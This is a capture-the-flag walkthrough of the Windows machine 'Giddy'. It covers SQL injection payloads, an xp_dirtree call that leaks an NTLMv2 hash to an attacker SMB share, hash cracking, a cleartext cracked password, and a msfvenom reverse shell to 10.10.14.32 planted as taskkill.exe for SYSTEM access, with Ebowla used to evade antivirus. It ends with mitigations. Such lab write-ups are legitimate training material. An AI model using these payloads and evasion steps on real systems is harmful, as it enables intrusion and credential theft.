## Introduction

In this walkthrough, we explore **Giddy**, a medium-difficulty Windows machine that demonstrates how a **low-privileged SQL Server login** can be leveraged to compromise the **SQL Server service account**. We initially gain access as the user `stacy` through SQL misconfiguration, that allowed that user to authenticate to our fake SMB server and offering its NTLMv2 hash.

Enumerating the system further, we identify a **vulnerable 64-bit application** installed on the machine. By crafting a **custom malicious executable**, bypassing antivirus detection, and placing it in the application's directory, we exploit the vulnerability to execute code as `NT AUTHORITY\SYSTEM`, thereby achieving full system compromise.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 3389 (RDP)

We donâ€™t potential usernames or password candidates.

### Port 5985 (WinRM)

â€¦

## Web

### Port 80

Version - Microsoft IIS httpd 10.0

Visiting the website we see:

![image.png](image%201.png)

Running gobuster:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -b 403,404,400
```

![image.png](image%202.png)

`Remote` directory is for remote access using powershell .

### Port 443

The same as port 80 but with https.

## Exploitation

I saw `.aspx` application tries to access data, that potentially indicates SQL injection possibility, thatâ€™s why I appended `'` to the accessed value:

![image.png](image%203.png)

It returned a `SQL` error, then I tried to identify how many columns are present in the database by using `ORDER BY .`

And finally 26 returned an error that means there are 25 columns.

```bash
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=4 union select null,@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
```

Returned:

![image.png](image%204.png)

```bash
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=4 union select null,current_user,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
```

![image.png](image%205.png)

`union select null,name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from sys.databases;`

![image.png](image%206.png)

`4 union select null,table_name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from Injection.INFORMATION_SCHEMA.TABLES;`

![image.png](image%207.png)

`4 union select null,column_name,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null from information_schema.columns where table_name='Users';`

![image.png](image%208.png)

Before dumping MSSQL database first we should check if `xp_cmdshell` or `xp_dirtree` work, for that I am gonna include at the end another query to access our SMB share.

`4 union select null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; EXEC xp_dirtree '\\10.10.14.32\share\file';--`

```bash
sudo impacket-smbserver share ./ -smb2support
```

![image.png](image%209.png)

We got NTLMv2 hash, now I am gonna crack it with hashcat.

```bash
hashcat -m 5600 stacy.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2010.png)

It is cracked successfully.

>Here actually we donâ€™t need to write all that 25 columns, I just didnâ€™t delete it during the process, you can get hash easily with `4;EXEC xp_dirtree '\\10.10.14.32\share\file';--`.
{: .prompt-tip }

Now letâ€™s try to connect to the machine using obtained credentails:

```bash
stacy : xNnWo6272k7x
```

I tried connecting with RDP, but it failed:

```bash
xfreerdp /u:stacy /p:xNnWo6272k7x /v:$IP
```

![image.png](image%2011.png)

Now we are in.

```bash
evil-winrm -i $IP -u stacy -p 'xNnWo6272k7xâ€™
```

![image.png](image%2012.png)

The only low-privileged user is stacy, so I donâ€™t need to do privilege escalation.

## Privilege Escalation

    [Privileged File Write EOP](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
    

Checking Stacyâ€™s directories I found `unifivideo` file, and checking her command history I see she stopped the service and tried to get it.

```powershell
Get-Service -Name Unifivideoservice
```

![image.png](image%2014.png)

Checking for public exploits available for this app I found:

[Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/43390)

We can also check the existence of the program by using the following command which lists all x64 applications:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

![image.png](image%2015.png)

<aside>
ðŸš¨

Upon start and stop of the service, it tries to load and execute the file at
"C:\ProgramData\unifi-video\taskkill.exe". However this file does not exist in
the application directory by default at all.

By copying an arbitrary "taskkill.exe" to "C:\ProgramData\unifi-video\" as an
unprivileged user, it is therefore possible to escalate privileges and execute
arbitrary code as NT AUTHORITY/SYSTEM

</aside>

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.32 LPORT=445 -f exe -o taskkill.exe
```

![image.png](image%2016.png)

```powershell
Stop-Service -Name Unifivideoservice -Force
```

Stop service and start again.

I have identified that antivirus is present on the target system, because my reverse shell keeps getting deleted. I tried to use `veil` but it failed to evade. I am gonna use `Ebowla` you can see the usage frm Ippsecâ€™s video here:

[Ebowla Setup and Usage](https://youtube.com/watch?v=l-wzBhc9wFc&t=2756)

Clone git repo, go to that directory:

```bash
git clone https://github.com/Genetic-Malware/Ebowla
```

[https://github.com/Genetic-Malware/Ebowla](https://github.com/Genetic-Malware/Ebowla)

1. Generate `.exe` file:
    
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.32 LPORT=445 -f exe -a x64 -o shell-445.exe
    ```
    
2. Change `genetic.config` file
    
    ![image.png](image%2017.png)
    
    ![image.png](image%2018.png)
    
    ```bash
    python ebowla.py shell-445.exe genetic.config
    ```
    
3. Then run build script
    
    ```bash
    ./build_x64_go.sh ./output/go_symmetric_shell-445.exe.go taskkill.exe
    ```
    

New file will be put inside of `output` directory.

Now we can see that out shell is not getting deleted, and after stopping the service we get a reverse shell:

```powershell
sc.exe stop Unifivideoservice
```

## Exploitaiton

- Ensure **SQL Server roles** are properly restricted and reviewed regularly for **least-privilege** access.
- Run SQL services under **non-privileged, isolated service accounts**.
- Regularly **patch third-party applications**, especially those running with elevated privileges.
- Use **application whitelisting** to restrict what executables can run in sensitive directories.
- Deploy **EDR and AV solutions** capable of detecting **custom or obfuscated payloads** and unusual application behavior.
